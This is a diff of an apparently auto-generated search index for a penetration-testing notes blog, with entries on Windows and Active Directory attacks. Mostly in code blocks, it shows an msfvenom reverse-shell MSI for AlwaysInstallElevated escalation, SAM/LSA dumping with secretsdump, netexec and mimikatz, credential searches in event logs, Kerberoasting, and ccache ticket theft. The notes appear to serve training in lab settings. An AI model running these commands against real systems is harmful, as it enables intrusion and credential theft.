@@ -437,6 +437,63 @@
       </tags>
   </entry>
   <entry>
+    <title>AlwaysInstallElevated</title>
+    <url>/2026/06/26/AlwaysInstallElevated/</url>
+    <content><![CDATA[<blockquote>
+<p>Windows can be configured to allow MSI packages to be installed with SYSTEM privileges by any user through the <code>AlwaysInstallElevated</code> policy.</p>
+</blockquote>
+<h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><blockquote>
+<p>Check whether the AlwaysInstallElevated policy is enabled.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If both registry keys contain:</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>The system is vulnerable.</p>
+</blockquote>
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><blockquote>
+<p>Generate a malicious MSI payload.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;port&gt; -f msi &gt; shell.msi</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer the MSI package to the target and execute it.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msiexec /i shell.msi /quiet /qn /norestart</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Catch the incoming reverse shell.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Misconfigurations</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Privilege-Escalation</tag>
+        <tag>AlwaysInstallElevated</tag>
+        <tag>MSI</tag>
+        <tag>Windows-Installer</tag>
+        <tag>msiexec</tag>
+        <tag>msfvenom</tag>
+        <tag>Registry</tag>
+        <tag>Registry-Policies</tag>
+        <tag>SYSTEM</tag>
+        <tag>Windows-Misconfiguration</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Attacking Child-Parent Trust From Linux</title>
     <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
     <content><![CDATA[<blockquote>
@@ -909,36 +966,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Event Log Readers</title>
-    <url>/2026/03/06/Event-Log-Readers/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
-</blockquote>
-<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
-<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
-<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Groups</category>
-      </categories>
-      <tags>
-        <tag>wevtutil</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Enumerating &amp; Retrieving Password Policies</title>
     <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
     <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
@@ -969,6 +996,36 @@
         <tag>rpcclient</tag>
         <tag>ldapsearch</tag>
         <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Event Log Readers</title>
+    <url>/2026/03/06/Event-Log-Readers/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+</blockquote>
+<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
+<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
+<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>wevtutil</tag>
       </tags>
   </entry>
   <entry>
@@ -1049,6 +1106,45 @@
       </tags>
   </entry>
   <entry>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-SAM</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hyper-V Administrators</title>
     <url>/2026/03/06/Hyper-V-Administrators/</url>
     <content><![CDATA[<blockquote>
@@ -1092,42 +1188,38 @@
       </categories>
   </entry>
   <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+    <title>Kerberoasting &amp; ASREPRoasting</title>
+    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
+    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
 
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+<p>GetNPUsers</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
-
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
+<p>Requesting TGS Ticket For Specific Account : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Requesting all TGS Tickets : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
+        <category>Exploitation</category>
+        <category>Kerberoasting &amp; ASREPRoasting</category>
       </categories>
       <tags>
-        <tag>Dump-SAM</tag>
+        <tag>impacket-GetNPUsers</tag>
       </tags>
   </entry>
   <entry>
@@ -1173,9 +1265,9 @@
         <category>Old Systems</category>
       </categories>
       <tags>
-        <tag>CVE</tag>
         <tag>Windows</tag>
         <tag>Privilege-Escalation</tag>
+        <tag>CVE</tag>
         <tag>Legacy-Systems</tag>
         <tag>Watson</tag>
         <tag>Sherlock</tag>
@@ -1185,41 +1277,6 @@
         <tag>Local-Exploit-Suggester</tag>
         <tag>Windows-Updates</tag>
         <tag>HotFix</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kerberoasting &amp; ASREPRoasting</title>
-    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
-    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
-
-<p>GetNPUsers</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
-<p>Requesting TGS Ticket For Specific Account : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Requesting all TGS Tickets : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Kerberoasting &amp; ASREPRoasting</category>
-      </categories>
-      <tags>
-        <tag>impacket-GetNPUsers</tag>
       </tags>
   </entry>
   <entry>
@@ -1423,6 +1480,7 @@
         <category>Services</category>
       </categories>
       <tags>
+        <tag>msfvenom</tag>
         <tag>Windows-Privesc</tag>
         <tag>Startup-Apps</tag>
         <tag>Logon-Autorun</tag>
@@ -1431,7 +1489,6 @@
         <tag>Win32_StartupCommand</tag>
         <tag>Weak-ACL</tag>
         <tag>AccessChk</tag>
-        <tag>msfvenom</tag>
         <tag>icacls</tag>
       </tags>
   </entry>
@@ -1799,6 +1856,38 @@
       </tags>
   </entry>
   <entry>
+    <title>PTT : Abusing KeyTab ccache</title>
+    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
+    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
+<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
+
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab Ccache Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>ccache</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PTT : KeyTab File Abuse</title>
     <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
     <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
@@ -1843,35 +1932,71 @@
       </tags>
   </entry>
   <entry>
-    <title>PTT : Abusing KeyTab ccache</title>
-    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
-    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+    <title>Permissive File System ACLs</title>
+    <url>/2026/06/19/Permissive-File-System-ACLs/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Permissive File System ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically <code>SYSTEM</code>.</p>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Modifiable-Service-Binaries"><a href="#Enumerating-Modifiable-Service-Binaries" class="headerlink" title="Enumerating Modifiable Service Binaries"></a>Enumerating Modifiable Service Binaries</h4><blockquote>
+<p>➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under <code>Modifiable Service Binaries</code>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Service Binaries ===</span><br><span class="line"></span><br><span class="line">  Name             : service<span class="literal">-name</span></span><br><span class="line">  DisplayName      : Service Display Name</span><br><span class="line">  Description      : Service description</span><br><span class="line">  State            : Stopped</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">  &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
 
